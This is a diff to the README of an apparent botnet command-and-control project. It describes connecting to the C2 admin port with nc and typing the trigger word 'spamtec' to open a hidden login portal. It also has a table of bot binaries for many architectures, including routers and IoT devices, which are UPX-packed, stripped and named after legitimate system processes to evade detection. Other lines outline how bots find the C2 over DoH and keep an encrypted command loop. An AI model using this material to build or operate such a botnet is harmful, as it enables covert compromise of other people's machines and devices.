@@ -79,9 +79,26 @@ Review `setup_config.txt` to see current:
 ```bash
 ./server --split
 # Then connect with: nc <c2-ip> <admin-port>
+# type "spamtec" to trigger hidden login portal
+(uses users.json db)
 ```
+[COMMANDS.md](cnc/COMMANDS.md) | **Complete CNC command reference**     
 
 Bot binaries are automatically cross-compiled to `bot/bins/`.
+
+
+## 🧬 Supported Architectures & Stealth Binaries
+
+| Binary Name   | Architecture | Target Platforms                     |
+|---------------|--------------|--------------------------------------|
+| `kworkerd0`   | x86 (386)    | Linux 32-bit                         |
+| `ethd0`       | x86_64       | Linux 64-bit (most common)           |
+| `mdsync1`     | ARMv7        | Raspberry Pi 2/3, older ARM devices  |
+| `ip6addrd`    | ARM64        | Raspberry Pi 4, modern Android, AWS Graviton |
+| `httpd`       | MIPS         | Routers, IoT devices                 |
+| `...`         | +12 more     | PPC64, RISC-V, s390x, loong64, etc.  |
+
+All binaries are UPX-packed, stripped, and named to blend with legitimate system processes.
 
 ## Architecture Overview
 
@@ -103,19 +120,6 @@ Bot binaries are automatically cross-compiled to `bot/bins/`.
 2. Resolves C2 via DoH TXT / DNS A records
 3. TLS 1.3 handshake → HMAC challenge → MD5(ch + MAGIC + ch)
 4. Successful auth → encrypted command loop
-
-## 🧬 Supported Architectures & Stealth Binaries
-
-| Binary Name   | Architecture | Target Platforms                     |
-|---------------|--------------|--------------------------------------|
-| `kworkerd0`   | x86 (386)    | Linux 32-bit                         |
-| `ethd0`       | x86_64       | Linux 64-bit (most common)           |
-| `mdsync1`     | ARMv7        | Raspberry Pi 2/3, older ARM devices  |
-| `ip6addrd`    | ARM64        | Raspberry Pi 4, modern Android, AWS Graviton |
-| `httpd`       | MIPS         | Routers, IoT devices                 |
-| `...`         | +12 more     | PPC64, RISC-V, s390x, loong64, etc.  |
-
-All binaries are UPX-packed, stripped, and named to blend with legitimate system processes.
 
 ## 📜 Documentation
 
